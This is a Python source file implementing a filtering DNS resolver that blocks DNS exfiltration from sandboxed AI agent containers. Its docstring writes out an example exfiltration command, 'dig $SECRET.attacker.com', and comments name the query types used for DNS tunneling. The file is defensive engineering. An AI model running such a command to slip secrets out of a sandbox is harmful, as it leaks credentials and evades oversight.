"""Authoritative DNS resolver for agent containers (EC-2, C-1).

Before EC-2 the agent bridge used Docker's embedded DNS (127.0.0.11),
which forwards unknown names to the host resolver. That leaves a wide-
open DNS exfil channel: ``dig $SECRET.attacker.com`` succeeds and
attacker logs capture ``$SECRET`` in the query name regardless of any
HTTP layer restrictions.

This module replaces the embedded resolver: agent containers have
``HostConfig.Dns`` pinned to the gateway's bridge IP, so every DNS
query from the agent arrives here. The gateway then:

  1. Accepts only A / AAAA / CNAME queries (blocks TXT / ANY / SRV /
     NULL / WKS which are the usual tunneling carriers).
  2. Resolves the source IP to an Identity; unknown source → REFUSED.
  3. Runs the same Safety pipeline as forward_proxy, with mode='dns'.
  4. On allow, recurses to the upstream resolver list.
  5. On block, responds NXDOMAIN — the attacker's DNS server gets
     nothing, not even a resolve-failure signal, because we never
     emit the query upstream.
"""

from __future__ import annotations

import asyncio
import socket
from dataclasses import dataclass
from typing import TYPE_CHECKING

from rolemesh.core.logger import get_logger

from .safety_call import EgressRequest

if TYPE_CHECKING:
    from .identity import IdentityResolver
    from .safety_call import EgressSafetyCaller

logger = get_logger()


# DNS opcodes / rcodes. Hard-coded rather than imported from dnslib so
# tests can construct minimal wire packets without a dnslib import.
_RCODE_NOERROR = 0
_RCODE_FORMERR = 1
_RCODE_SERVFAIL = 2
_RCODE_NXDOMAIN = 3
_RCODE_REFUSED = 5

# Only these query types are ever recursively resolved. Anything else
# returns REFUSED — TXT/ANY are the classic exfiltration carriers, SRV
# and NULL can be abused similarly.
_ALLOWED_QTYPES: frozenset[str] = frozenset({"A", "AAAA", "CNAME"})

# UDP DNS packets are capped at 512 bytes over UDP without EDNS0 and
# 4096 with. We accept up to 4096 but only emit packets up to 512 to
# keep the response safe for any client stack.
_MAX_PACKET_BYTES = 4096


@dataclass(frozen=True)
class UpstreamResolver:
    """Single upstream resolver address. Typically one of 8.8.8.8 or 1.1.1.1."""

    host: str
    port: int = 53


class DnsServer:
    """Asyncio UDP server that evaluates each query through the Safety pipeline.

    State is captured in the constructor so the datagram handler is a
    pure function of the packet + the resolver closure — makes testing
    round-trips simpler without building a custom protocol class.
    """

    def __init__(
        self,
        *,
        identity_resolver: IdentityResolver,
        safety_caller: EgressSafetyCaller,
        upstreams: list[UpstreamResolver],
    ) -> None:
        if not upstreams:
            raise ValueError("DnsServer requires at least one upstream resolver")
        self._identity = identity_resolver
        self._safety = safety_caller
        self._upstreams = list(upstreams)
        self._transport: asyncio.DatagramTransport | None = None

    async def serve(self, host: str, port: int) -> None:
        """Bind UDP socket. Background loop is owned by the asyncio transport."""
        loop = asyncio.get_running_loop()
        transport, _ = await loop.create_datagram_endpoint(
            lambda: _DnsProtocol(self._handle_packet),
            local_addr=(host, port),
        )
        self._transport = transport
        logger.info("dns resolver listening", host=host, port=port)

    def close(self) -> None:
        if self._transport is not None:
            self._transport.close()
            self._transport = None

    async def _handle_packet(
        self,
        data: bytes,
        source_addr: tuple[str, int],
        respond: _Responder,
    ) -> None:
        """Decode one DNS query, run the safety pipeline, respond."""
        if len(data) > _MAX_PACKET_BYTES:
            logger.debug("dns: oversize packet dropped", size=len(data))
            return

        try:
            import dnslib  # type: ignore[import-untyped]
        except ImportError:
            logger.error(
                "dns: dnslib not installed — gateway cannot resolve. "
                "Build the gateway image with the EC-2 dependency set."
            )
            return

        try:
            query = dnslib.DNSRecord.parse(data)
        except Exception as exc:  # noqa: BLE001 — dnslib raises many shapes
            logger.debug("dns: parse failed", error=str(exc))
            return

        # Only one question per standard query. If more are present,
        # REFUSE — the attacker multiplexing scenario doesn't belong
        # on this resolver.
        if len(query.questions) != 1:
            respond(_build_error(query, _RCODE_REFUSED))
            return

        question = query.questions[0]
        qname = str(question.qname).rstrip(".")
        qtype = dnslib.QTYPE.get(question.qtype, f"TYPE{question.qtype}")

        if qtype not in _ALLOWED_QTYPES:
            logger.info(
                "dns: refused non-allowlisted qtype",
                source=source_addr[0],
                qname=qname,
                qtype=qtype,
            )
            respond(_build_error(query, _RCODE_REFUSED))
            return

        identity = self._identity.resolve(source_addr[0])
        decision = await self._safety.decide(
            identity=identity,
            request=EgressRequest(
                host=qname,
                port=0,  # DNS is port-less
                mode="dns",
                qtype=qtype,
            ),
        )
        if decision.action == "block":
            logger.info(
                "dns: blocked",
                source=source_addr[0],
                qname=qname,
                qtype=qtype,
                reason=decision.reason,
            )
            respond(_build_error(query, _RCODE_NXDOMAIN))
            return

        # Recurse upstream. The first upstream to respond within budget
        # wins; the rest are cancelled. Falling all the way through
        # yields SERVFAIL — we don't want to leak resolver outages as
        # NXDOMAIN, because admins confuse the two.
        response_data = await self._resolve_upstream(data)
        if response_data is None:
            respond(_build_error(query, _RCODE_SERVFAIL))
            return
        respond(response_data)

    async def _resolve_upstream(self, data: bytes) -> bytes | None:
        """Forward the raw query to the first upstream that responds.

        Run resolvers in parallel with a 2-second budget. Raw-packet
        forwarding preserves client flags (EDNS0, CD, AD) verbatim.
        """
        async def _query(up: UpstreamResolver) -> bytes:
            return await _udp_query(up.host, up.port, data, timeout_s=2.0)

        tasks = [asyncio.create_task(_query(up)) for up in self._upstreams]
        try:
            done, _pending = await asyncio.wait(
                tasks, return_when=asyncio.FIRST_COMPLETED, timeout=2.5
            )
        finally:
            for t in tasks:
                if not t.done():
                    t.cancel()
        for t in done:
            if t.exception() is None:
                return t.result()
        return None


# ---------------------------------------------------------------------------
# Low-level DNS helpers
# ---------------------------------------------------------------------------


_Responder = "type: ignore[name-defined]"  # placeholder; real type below


class _DnsProtocol(asyncio.DatagramProtocol):
    """asyncio DatagramProtocol that proxies each packet to a handler coroutine."""

    def __init__(
        self,
        handler: object,
    ) -> None:
        self._handler = handler
        self._transport: asyncio.DatagramTransport | None = None
        self._in_flight: set[asyncio.Task[None]] = set()

    def connection_made(self, transport: object) -> None:  # type: ignore[override]
        self._transport = transport  # type: ignore[assignment]

    def datagram_received(self, data: bytes, addr: tuple[str, int]) -> None:
        if self._transport is None:
            return
        transport = self._transport

        def _respond(payload: bytes) -> None:
            try:
                transport.sendto(payload, addr)
            except OSError as exc:
                logger.debug("dns: send failed", error=str(exc), addr=addr)

        # Keep a reference to the spawned task so Python's GC doesn't
        # collect it mid-flight. The set lives on the protocol instance
        # so shutdown can cancel in-flight handlers cleanly.
        task = asyncio.create_task(self._handler(data, addr, _respond))  # type: ignore[arg-type]
        self._in_flight.add(task)
        task.add_done_callback(self._in_flight.discard)


def _build_error(query: object, rcode: int) -> bytes:
    """Serialize a reply carrying the given rcode for a parsed query."""

    reply = query.reply()  # type: ignore[attr-defined]
    reply.header.rcode = rcode
    packed: bytes = reply.pack()
    return packed


async def _udp_query(
    host: str,
    port: int,
    data: bytes,
    *,
    timeout_s: float,
) -> bytes:
    """Single upstream DNS query over UDP, raw packet in, raw packet out.

    Uses ``loop.sock_sendto`` / ``loop.sock_recvfrom`` rather than a
    StreamReader because DNS is a single-datagram protocol — no framing
    concerns.
    """
    loop = asyncio.get_running_loop()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    try:
        await loop.sock_sendto(sock, data, (host, port))
        fut = loop.sock_recvfrom(sock, _MAX_PACKET_BYTES)
        received, _addr = await asyncio.wait_for(fut, timeout=timeout_s)
        return received
    finally:
        sock.close()
